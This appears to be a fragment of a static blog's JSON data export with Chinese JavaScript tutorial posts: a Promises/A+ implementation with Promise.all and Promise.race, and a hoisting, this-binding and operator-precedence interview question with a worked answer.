class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 1. new Promise时，需要传递一个 executor 执行器，执行器立刻执行</span></span><br><span class=\"line\"><span class=\"comment\"> * 2. executor 接受两个参数，分别是 resolve 和 reject</span></span><br><span class=\"line\"><span class=\"comment\"> * 3. promise 只能从 pending 到 rejected, 或者从 pending 到 fulfilled</span></span><br><span class=\"line\"><span class=\"comment\"> * 4. promise 的状态一旦确认，就不会再改变</span></span><br><span class=\"line\"><span class=\"comment\"> * 5. promise 都有 then 方法，then 接收两个参数，分别是 promise 成功的回调 onFulfilled, </span></span><br><span class=\"line\"><span class=\"comment\"> *      和 promise 失败的回调 onRejected</span></span><br><span class=\"line\"><span class=\"comment\"> * 6. 如果调用 then 时，promise已经成功，则执行 onFulfilled，并将promise的值作为参数传递进去。</span></span><br><span class=\"line\"><span class=\"comment\"> *      如果promise已经失败，那么执行 onRejected, 并将 promise 失败的原因作为参数传递进去。</span></span><br><span class=\"line\"><span class=\"comment\"> *      如果promise的状态是pending，需要将onFulfilled和onRejected函数存放起来，等待状态确定后，再依次将对应的函数执行(发布订阅)</span></span><br><span class=\"line\"><span class=\"comment\"> * 7. then 的参数 onFulfilled 和 onRejected 可以缺省</span></span><br><span class=\"line\"><span class=\"comment\"> * 8. promise 可以then多次，promise 的then 方法返回一个 promise</span></span><br><span class=\"line\"><span class=\"comment\"> * 9. 如果 then 返回的是一个结果，那么就会把这个结果作为参数，传递给下一个then的成功的回调(onFulfilled)</span></span><br><span class=\"line\"><span class=\"comment\"> * 10. 如果 then 中抛出了异常，那么就会把这个异常作为参数，传递给下一个then的失败的回调(onRejected)</span></span><br><span class=\"line\"><span class=\"comment\"> * 11.如果 then 返回的是一个promise,那么需要等这个promise，那么会等这个promise执行完，promise如果成功，</span></span><br><span class=\"line\"><span class=\"comment\"> *   就走下一个then的成功，如果失败，就走下一个then的失败</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> PENDING = <span class=\"string\">&#x27;pending&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> FULFILLED = <span class=\"string\">&#x27;fulfilled&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> REJECTED = <span class=\"string\">&#x27;rejected&#x27;</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Promise</span>(<span class=\"params\">executor</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> self = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">    self.status = PENDING;</span><br><span class=\"line\">    self.onFulfilled = [];<span class=\"comment\">//成功的回调</span></span><br><span class=\"line\">    self.onRejected = []; <span class=\"comment\">//失败的回调</span></span><br><span class=\"line\">    <span class=\"comment\">//PromiseA+ 2.1</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.status === PENDING) &#123;</span><br><span class=\"line\">            self.status = FULFILLED;</span><br><span class=\"line\">            self.value = value;</span><br><span class=\"line\">            self.onFulfilled.forEach(<span class=\"function\"><span class=\"params\">fn</span> =&gt;</span> fn());<span class=\"comment\">//PromiseA+ 2.2.6.1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">reject</span>(<span class=\"params\">reason</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.status === PENDING) &#123;</span><br><span class=\"line\">            self.status = REJECTED;</span><br><span class=\"line\">            self.reason = reason;</span><br><span class=\"line\">            self.onRejected.forEach(<span class=\"function\"><span class=\"params\">fn</span> =&gt;</span> fn());<span class=\"comment\">//PromiseA+ 2.2.6.2</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        executor(resolve, reject);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        reject(e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Promise</span>.prototype.then = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">onFulfilled, onRejected</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//PromiseA+ 2.2.1 / PromiseA+ 2.2.5 / PromiseA+ 2.2.7.3 / PromiseA+ 2.2.7.4</span></span><br><span class=\"line\">    onFulfilled = <span class=\"keyword\">typeof</span> onFulfilled === <span class=\"string\">&#x27;function&#x27;</span> ? onFulfilled : <span class=\"function\"><span class=\"params\">value</span> =&gt;</span> value;</span><br><span class=\"line\">    onRejected = <span class=\"keyword\">typeof</span> onRejected === <span class=\"string\">&#x27;function&#x27;</span> ? onRejected : <span class=\"function\"><span class=\"params\">reason</span> =&gt;</span> &#123; <span class=\"keyword\">throw</span> reason &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> self = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">    <span class=\"comment\">//PromiseA+ 2.2.7</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> promise2 = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.status === FULFILLED) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//PromiseA+ 2.2.2</span></span><br><span class=\"line\">            <span class=\"comment\">//PromiseA+ 2.2.4 --- setTimeout</span></span><br><span class=\"line\">            <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//PromiseA+ 2.2.7.1</span></span><br><span class=\"line\">                    <span class=\"keyword\">let</span> x = onFulfilled(self.value);</span><br><span class=\"line\">                    resolvePromise(promise2, x, resolve, reject);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//PromiseA+ 2.2.7.2</span></span><br><span class=\"line\">                    reject(e);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (self.status === REJECTED) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//PromiseA+ 2.2.3</span></span><br><span class=\"line\">            <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">let</span> x = onRejected(self.reason);</span><br><span class=\"line\">                    resolvePromise(promise2, x, resolve, reject);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                    reject(e);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (self.status === PENDING) &#123;</span><br><span class=\"line\">            self.onFulfilled.push(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> x = onFulfilled(self.value);</span><br><span class=\"line\">                        resolvePromise(promise2, x, resolve, reject);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                        reject(e);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            self.onRejected.push(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> x = onRejected(self.reason);</span><br><span class=\"line\">                        resolvePromise(promise2, x, resolve, reject);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                        reject(e);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> promise2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolvePromise</span>(<span class=\"params\">promise2, x, resolve, reject</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> self = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">    <span class=\"comment\">//PromiseA+ 2.3.1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (promise2 === x) &#123;</span><br><span class=\"line\">        reject(<span class=\"keyword\">new</span> <span class=\"built_in\">TypeError</span>(<span class=\"string\">&#x27;Chaining cycle&#x27;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x &amp;&amp; <span class=\"keyword\">typeof</span> x === <span class=\"string\">&#x27;object&#x27;</span> || <span class=\"keyword\">typeof</span> x === <span class=\"string\">&#x27;function&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> used; <span class=\"comment\">//PromiseA+2.3.3.3.3 只能调用一次</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> then = x.then;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> then === <span class=\"string\">&#x27;function&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//PromiseA+2.3.3</span></span><br><span class=\"line\">                then.call(x, <span class=\"function\">(<span class=\"params\">y</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//PromiseA+2.3.3.1</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (used) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    used = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                    resolvePromise(promise2, y, resolve, reject);</span><br><span class=\"line\">                &#125;, <span class=\"function\">(<span class=\"params\">r</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//PromiseA+2.3.3.2</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (used) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    used = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                    reject(r);</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//PromiseA+2.3.3.4</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (used) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                used = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                resolve(x);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//PromiseA+ 2.3.3.2</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (used) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            used = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            reject(e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//PromiseA+ 2.3.3.4</span></span><br><span class=\"line\">        resolve(x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"built_in\">Promise</span>;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Promise-all\"><a href=\"#Promise-all\" class=\"headerlink\" title=\"Promise.all\"></a>Promise.all</h3><p><code>Promise.all(promises)</code> 返回一个 promise 对象</p>\n<ul>\n<li>如果传入的参数是一个空的可迭代对象，那么此 promise 对象回调完成(resolve), 只有此情况，是同步执行的，其它都是异步返回的。</li>\n<li>如果传入的参数不包含任何 promise，则返回一个异步完成.</li>\n<li>promises 中所有的 promise 都 “完成”时或参数中不包含 promise 时回调完成。</li>\n<li>如果参数中有一个 promise 失败，那么 Promise.all 返回的 promise 对象失败</li>\n<li>在任何情况下，Promise.all 返回的 promise 的完成状态的结果都是一个数组</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Promise</span>.all = <span class=\"keyword\">async</span> (list) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!list || !<span class=\"built_in\">Array</span>.isArray(list)) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&#x27;Type Error&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!list.length) <span class=\"keyword\">return</span> resolve([]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> resList = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> processValue = <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      index++;</span><br><span class=\"line\">      resList[i] = data;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (index === list.length) &#123;</span><br><span class=\"line\">        resolve(resList);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; list.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> item = list[i];</span><br><span class=\"line\">      <span class=\"comment\">// item 可能为普通值、也可能为 promise 对象</span></span><br><span class=\"line\">      <span class=\"built_in\">Promise</span>.resolve(item).then(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        processValue(data, i);</span><br><span class=\"line\">      &#125;).catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        reject(error);</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Promise-race\"><a href=\"#Promise-race\" class=\"headerlink\" title=\"Promise.race\"></a>Promise.race</h3><p>Promise.race 函数返回一个 Promise，它将与第一个传递的 promise 相同的完成方式被完成。它可以是完成（ resolves），也可以是失败（rejects），这要取决于第一个完成的方式是两个中的哪个。</p>\n<p>如果传的参数数组是空，则返回的 promise 将永远等待。</p>\n<p>如果迭代包含一个或多个非承诺值和/或已解决/拒绝的承诺，则 Promise.race 将解析为迭代中找到的第一个值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Promise</span>.race = <span class=\"keyword\">async</span> (list) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!list || !<span class=\"built_in\">Array</span>.isArray(list)) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&#x27;Type Error&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!list.length) <span class=\"keyword\">return</span> resolve();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; list.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> item = list[i];</span><br><span class=\"line\">      <span class=\"comment\">// item 可能为普通值、也可能为 promise 对象</span></span><br><span class=\"line\">      <span class=\"built_in\">Promise</span>.resolve(item).then(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        resolve(data, i);</span><br><span class=\"line\">      &#125;).catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        reject(error);</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h5><p><a href=\"https://github.com/YvetteLau/Blog/issues/2\">Promise 的源码实现</a></p>\n"},{"title":"变量提升、this 指向、运算符优先级问题","date":"2021-03-12T07:32:28.000Z","_content":"\n# 变量提升、this 指向、运算符优先级问题\n\n```js\nfunction Foo() {\n    getName = function () { alert (1); };\n    return this;\n}\nFoo.getName = function () { alert (2);};\nFoo.prototype.getName = function () { alert (3);};\nvar getName = function () { alert (4);};\nfunction getName() { alert (5);}\n\n//请写出以下输出结果：\nFoo.getName();\ngetName();\nFoo().getName();\ngetName();\nnew Foo.getName();\nnew Foo().getName();\nnew new Foo().getName();\n```\n\n**分析：**\n* 第一问的 `Foo.getName` 指向 Foo 函数上存储的静态属性\n* 第二问的 `getName` 指向的是 `function () { alert (4);}`\n  * 通过 `var` 声明的变量挂载在 `window` 对象下\n  * 函数 `function getName() { alert (5);}` 会被提升到最前面\n  * 语句 `var getName = function () { alert (4);};` 会先进行变量提升，值为 `undefined`，然后执行到赋值语句时 `getName` 指向 `function () { alert (4);}`\n* 第三问的 `Foo().getName()` 最终指向 `function () { alert (1); }`\n  * `Foo()` 执行时会将 `getName` 赋值为 `function () { alert (1); }`\n  * `Foo()` 执行完成后的返回值为 `this`，此时 `this` 指向 `window`\n  * 相当于执行 `window.getName()`\n* 第四问的 `getName`，相当于执行 `window.getName`\n* 第五问的 `new Foo.getName()` 相当于是 `new (Foo.getName)()`\n* 第六问的 `new Foo().getName()` 相当于是 `(new Foo()).getName()`\n* 第七问的 `new new Foo().getName()` 相当于是 `new ((new Foo()).getName)()`\n\n```js\n// ---答案---\n\nFoo.getName(); // 2\ngetName(); // 4\nFoo().getName(); // 1\ngetName(); // 1\nnew Foo.getName(); // 2\nnew Foo().getName(); // 3\nnew new Foo().getName(); // 2\n```\n\n### 相关链接\n1. [前端同学经常忽视的一个 JavaScript 面试题](https://mp.weixin.qq.com/s?__biz=MzAwNjI5MTYyMw==&mid=2651498460&idx=1&sn=ab7433e025580f16b15ba48f81e7e907&chksm=80f1ae14b78627029edc3da2b3c6f4e4a9e0d5f442450e05debe25d0b94a67c3c0e01ce7be00&mpshare=1&scene=1&srcid=&sharer_sharetime=1588991552981&sharer_shareid=2bb1f9aa633b7a93bef080397533d2b0&exportkey=A85BTrV0JxNfJ%2B%2BlzGb8tTU%3D&pass_ticket=LD4J1MD7GBXWreZj7%2Bi2eqbeE9x6ynqxeR6QPJbW8ptOZX7CKzTf6gl0R48lxB9a#rd)","source":"_posts/JavaScript 编程题/变量提升、this 指向、运算符优先级问题.md","raw":"---\ntitle: 变量提升、this 指向、运算符优先级问题\ncategories: JavaScript 编程题\ntags: [编程题]\ndate: 2021-03-12 15:32:28\n---\n\n# 变量提升、this 指向、运算符优先级问题\n\n```js\nfunction Foo() {\n    getName = function () { alert (1); };\n    return this;\n}\nFoo.getName = function () { alert (2);};\nFoo.prototype.getName = function () { alert (3);};\nvar getName = function () { alert (4);};\nfunction getName() { alert (5);}\n\n//请写出以下输出结果：\nFoo.getName();\ngetName();\nFoo().getName();\ngetName();\nnew Foo.getName();\nnew Foo().getName();\nnew new Foo().getName();\n```\n\n**分析：**\n* 第一问的 `Foo.getName` 指向 Foo 函数上存储的静态属性\n* 第二问的 `getName` 指向的是 `function () { alert (4);}`\n  * 通过 `var` 声明的变量挂载在 `window` 对象下\n  * 函数 `function getName() { alert (5);}` 会被提升到最前面\n  * 语句 `var getName = function () { alert (4);};` 会先进行变量提升，值为 `undefined`，然后执行到赋值语句时 `getName` 指向 `function () { alert (4);}`\n* 第三问的 `Foo().getName()` 最终指向 `function () { alert (1); }`\n  * `Foo()` 执行时会将 `getName` 赋值为 `function () { alert (1); }`\n  * `Foo()` 执行完成后的返回值为 `this`，此时 `this` 指向 `window`\n  * 相当于执行 `window.getName()`\n* 第四问的 `getName`，相当于执行 `window.getName`\n* 第五问的 `new Foo.getName()` 相当于是 `new (Foo.getName)()`\n* 第六问的 `new Foo().getName()` 相当于是 `(new Foo()).getName()`\n* 第七问的 `new new Foo().getName()` 相当于是 `new ((new Foo()).getName)()`\n\n```js\n// ---答案---\n\nFoo.getName(); // 2\ngetName(); // 4\nFoo().getName(); // 1\ngetName(); // 1\nnew Foo.getName(); // 2\nnew Foo().getName(); // 3\nnew new Foo().getName(); // 2\n```\n\n### 相关链接\n1. [前端同学经常忽视的一个 JavaScript 面试题](https://mp.weixin.qq.com/s?__biz=MzAwNjI5MTYyMw==&mid=2651498460&idx=1&sn=ab7433e025580f16b15ba48f81e7e907&chksm=80f1ae14b78627029edc3da2b3c6f4e4a9e0d5f442450e05debe25d0b94a67c3c0e01ce7be00&mpshare=1&scene=1&srcid=&sharer_sharetime=1588991552981&sharer_shareid=2bb1f9aa633b7a93bef080397533d2b0&exportkey=A85BTrV0JxNfJ%2B%2BlzGb8tTU%3D&pass_ticket=LD4J1MD7GBXWreZj7%2Bi2eqbeE9x6ynqxeR6QPJbW8ptOZX7CKzTf6gl0R48lxB9a#rd)","slug":"JavaScript 编程题/变量提升、this 指向、运算符优先级问题","published":1,"updated":"2021-04-30T06:59:08.062Z","_id":"cko3yr635000vio6r081sctkl","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"变量提升、this-指向、运算符优先级问题\"><a href=\"#变量提升、this-指向、运算符优先级问题\" class=\"headerlink\" title=\"变量提升、this 指向、运算符优先级问题\"></a>变量提升、this 指向、运算符优先级问题</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">1</span>); &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo.getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">2</span>);&#125;;</span><br><span class=\"line\">Foo.prototype.getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">3</span>);&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">4</span>);&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getName</span>(<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//请写出以下输出结果：</span></span><br><span class=\"line\">Foo.getName();</span><br><span class=\"line\">getName();</span><br><span class=\"line\">Foo().getName();</span><br><span class=\"line\">getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo.getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo().getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"keyword\">new</span> Foo().getName();</span><br></pre></td></tr></table></figure>\n\n<p><strong>分析：</strong></p>\n<ul>\n<li>第一问的 <code>Foo.getName</code> 指向 Foo 函数上存储的静态属性</li>\n<li>第二问的 <code>getName</code> 指向的是 <code>function () &#123; alert (4);&#125;</code><ul>\n<li>通过 <code>var</code> 声明的变量挂载在 <code>window</code> 对象下</li>\n<li>函数 <code>function getName() &#123; alert (5);&#125;</code> 会被提升到最前面</li>\n<li>语句 <code>var getName = function () &#123; alert (4);&#125;;</code> 会先进行变量提升，值为 <code>undefined</code>，然后执行到赋值语句时 <code>getName</code> 指向 <code>function () &#123; alert (4);&#125;</code></li>\n</ul>\n</li>\n<li>第三问的 <code>Foo().getName()</code> 最终指向 <code>function () &#123; alert (1); &#125;</code><ul>\n<li><code>Foo()</code> 执行时会将 <code>getName</code> 赋值为 <code>function () &#123; alert (1); &#125;</code></li>\n<li><code>Foo()</code> 执行完成后的返回值为 <code>this</code>，此时 <code>this</code> 指向 <code>window</code></li>\n<li>相当于执行 <code>window.getName()</code></li>\n</ul>\n</li>\n<li>第四问的 <code>getName</code>，相当于执行 <code>window.getName</code></li>\n<li>第五问的 <code>new Foo.getName()</code> 相当于是 <code>new (Foo.getName)()</code></li>\n<li>第六问的 <code>new Foo().getName()</code> 相当于是 <code>(new Foo()).getName()</code></li>\n<li>第七问的 <code>new new Foo().getName()</code> 相当于是 <code>new ((new Foo()).getName)()</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ---答案---</span></span><br><span class=\"line\"></span><br><span class=\"line\">Foo.getName(); <span class=\"comment\">// 2</span></span><br><span class=\"line\">getName(); <span class=\"comment\">// 4</span></span><br><span class=\"line\">Foo().getName(); <span class=\"comment\">// 1</span></span><br><span class=\"line\">getName(); <span class=\"comment\">// 